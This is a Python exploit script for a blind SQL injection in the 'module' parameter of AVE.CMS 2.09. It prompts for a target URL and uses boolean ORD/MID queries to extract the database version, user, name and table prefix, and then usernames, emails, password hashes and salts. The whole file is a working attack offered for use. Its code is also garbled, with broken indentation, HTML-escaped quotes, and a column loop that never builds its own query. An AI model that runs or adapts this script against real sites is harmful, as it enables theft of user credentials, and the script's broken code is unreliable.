
import urllib, sys, time

#######################################################################################
# Exploit Title: AVE.CMS <= 2.09 - Remote Blind SQL Injection Exploit
# Date: 23/05/2013
# Author: mr.pr0n (@_pr0n_)
# Vendor Homepage: http://www.overdoze.ru/
# Software Link: websvn.avecms.ru/listing.php?repname=AVE.cms+2.09
# Version: V2.09 and 2.09RC2
# Tested on: Linux Debian 2.6.32-5-686
# Description: The "module" parameter is vulnerable to Blind SQL Injection.
# Solution : Update to newest version.
#######################################################################################

print "+----------------------------------------------------------+"
print "|    AVE.CMS <= 2.09 - Remote Blind SQL Injection Exploit  |"
print "+----------------------------------------------------------+"

## 
GREEN   = &#039;\033[32m&#039;
RESET   = &#039;\033[0;0m&#039;
##

########
true       = "404"
min       = 32
max       = 127
num_of_ltr  = 50
########

url   = raw_input("\nEnter the address of the target AVE.CMS\n> ")
if url[:7] != "http://":
  url = "http://" + url + "/index.php?module="
else:
  url = url + "/index.php?module="

database = []
options = {&#039;Version&#039;:&#039;VERSION&#039;, &#039;User&#039;:&#039;CURRENT_USER&#039;, &#039;Database&#039;:&#039;DATABASE&#039;}
sys.stdout.write("[+] Checking target... (please wait)...")
for element in options:
  sys.stdout.write("\n  [!] Database "+element+"  : ")
  for letter in range(1, num_of_ltr):
    for i in range(min, max):
      query = "-1%00&#039; OR ORD(MID(("+options[element]+"()),"+str(letter)+",1))>"+str(i)+"#"
      target = url + query
      result = urllib.urlopen(target).read()
      if result.find(true) != -1:
  if options[element] == "DATABASE":
    database.append(chr(i))
  sys.stdout.write(GREEN+chr(i)+RESET)
  sys.stdout.flush()
  break
  time.sleep(1)
database = [i for i in database if i != &#039; &#039;]
database = &#039;&#039;.join(database)
hexdatabase = database.encode("hex")

sys.stdout.write("\n[+] Checking for (random) Table Prefix... (please wait)... ")
sys.stdout.write("\n  [!] Table Prefix (for &#039;"+GREEN+database+RESET+"&#039; database) : ")
for letter in range(1, num_of_ltr):
  for letter2 in range(1, 7):
    for i in range(min, max):
      query = "-1%00&#039; OR ORD(MID((SELECT CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x"+hexdatabase+" LIMIT "+str(letter)+",1),"+str(letter2)+",1))>"+str(i)+"#"
      target = url + query
      result = urllib.urlopen(target).read()
      if result.find(true) != -1:
  sys.stdout.write(GREEN+chr(i)+RESET)
  sys.stdout.flush()
  break
  time.sleep(1)
  break

columns = {&#039;Password&#039;:&#039;password&#039;,&#039;Email&#039;:&#039;email&#039;,&#039;Username&#039;:&#039;user_name&#039;,&#039;Salt&#039;:&#039;salt&#039;}
for element in columns:
    sys.stdout.write("\n  [!] Column : "+element+"  : ")
    for letter in range(1, num_of_ltr):
      for i in range(min, max):
  target = url + query
  result = urllib.urlopen(target).read()
  if result.find(true) != -1:
    sys.stdout.write(GREEN+chr(i)+RESET)
    sys.stdout.flush()
    break
    time.sleep(1)

sys.stdout.write("\n[+] End of POC...\n")
#eof

